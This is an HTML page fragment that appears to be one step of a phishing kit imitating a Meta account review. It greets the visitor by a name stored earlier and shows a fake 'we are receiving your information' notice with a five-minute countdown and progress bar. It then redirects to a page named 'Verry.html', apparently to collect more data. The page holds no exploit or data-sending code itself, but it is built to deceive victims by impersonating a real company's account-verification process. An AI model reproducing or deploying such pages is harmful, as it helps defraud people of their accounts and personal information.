</head>

<body>
    <div id="home-page" class="app-wrapper container-fluid-width home-page">
        <section class="n n2 -f -j-s-b">
            <div class="n__it -f -a-c"><img src="./images/logometa.png" alt=""></div>
        </section>
        <!-- end -->
        <section class="ma -f -a-c -j-c-c" class="modal fade" id="veryModal" aria-modal="true" role="dialog"
            data-bs-keyboard="false" data-bs-backdrop="static">
            <div class="ma__m -f -j-s-b"><img src="./images/logowait.png" alt="">
                <div class="ma__m-i">
                    <p class="ma__m-i-t"><b>Hi <span id="name"></span>, we are receiving your information</b></p>
                    <p class="ma__m-i-s-t">Reviewing your activity takes just a few more moments. We might require
                        additional
                        information to confirm that this is your account.</p>
                    <p class="ma__m-i-s-t">Please wait, this could take up to 5 minutes, please be patient while we
                        review your
                        case... <span id="timewait"></span></p>
                    <div class="ma__m-p">
                        <div class="ma__m-p-r" style="width: 0%;"></div>
                    </div>
                </div>
            </div>
        </section>
    </div>
</body>

<script>
    var savedData = localStorage.getItem('name');
    $('#name').text(savedData);
    $(document).ready(function () {
        var minutes = 5;
        var seconds = minutes * 60;
        var initialWidth = 0.6667;
        var widthIncrement = (100 - initialWidth) / seconds;
        var interval = setInterval(function () {
            var remainingMinutes = Math.floor(seconds / 60);
            var remainingSeconds = seconds % 60;

            $("#timewait").text(`(wait ${remainingMinutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')})`);
            initialWidth += widthIncrement;
            $(".ma__m-p-r").css("width", `${initialWidth.toFixed(4)}%`);

            seconds--;
            if (seconds <= 0) {
                clearInterval(interval);
                window.location.href = "Verry.html";
            }
        }, 1000);
    });
</script>

</html>
